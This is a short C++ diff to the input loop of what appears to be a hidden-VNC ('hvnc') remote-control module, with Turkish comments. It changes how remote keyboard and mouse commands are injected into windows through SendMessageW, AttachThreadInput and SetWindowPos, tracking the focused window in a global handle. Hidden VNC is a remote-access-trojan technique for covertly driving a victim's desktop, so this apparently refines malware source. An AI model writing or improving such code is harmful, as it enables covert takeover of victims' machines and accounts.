@@ -398,8 +398,8 @@ static void input_loop() {
         // ---- Klavye ----
         if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
             int vk = cmd.value("keycode", 0);
-            HWND hTarget = GetFocusedWindow();
-            if (!hTarget) continue;
+            if (!IsWindow(g_hCurrentFocus)) continue;
+            HWND hTarget = g_hCurrentFocus;
 
             SendMessageW(hTarget, WM_SETFOCUS, 0, 0);
 
@@ -519,11 +519,8 @@ static void input_loop() {
             SendMessageW(hRoot, WM_ACTIVATE, WA_CLICKACTIVE, (LPARAM)hRoot);
             SendMessageW(hwnd, WM_SETFOCUS, (WPARAM)hFore, 0);
 
-            // Detach threads
             if (foregroundThreadId && foregroundThreadId != currentThreadId) AttachThreadInput(currentThreadId, foregroundThreadId, FALSE);
             if (targetThreadId != currentThreadId) AttachThreadInput(currentThreadId, targetThreadId, FALSE);
-
-            g_hCurrentFocus = hwnd;
 
             // Z-Order enforcement
             SetWindowPos(hRoot, HWND_TOP, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
@@ -531,6 +528,7 @@ static void input_loop() {
             LRESULT ht = SendMessageW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y));
 
             if (ht != HTCLIENT) {
+                g_hCurrentFocus = hRoot;
                 // Title bar buttons (Close, Min, Max)
                 if (btn == 0) {
                     if (ht == HTCLOSE) {
@@ -567,6 +565,8 @@ static void input_loop() {
                 HWND hChild  = ChildWindowFromPointEx(hwnd, screenPt,
                                                       CWP_SKIPINVISIBLE | CWP_SKIPDISABLED);
                 if (hChild && hChild != hwnd) hTarget = hChild;
+
+                g_hCurrentFocus = hTarget;
 
                 POINT clientPt = screenPt;
                 ScreenToClient(hTarget, &clientPt);
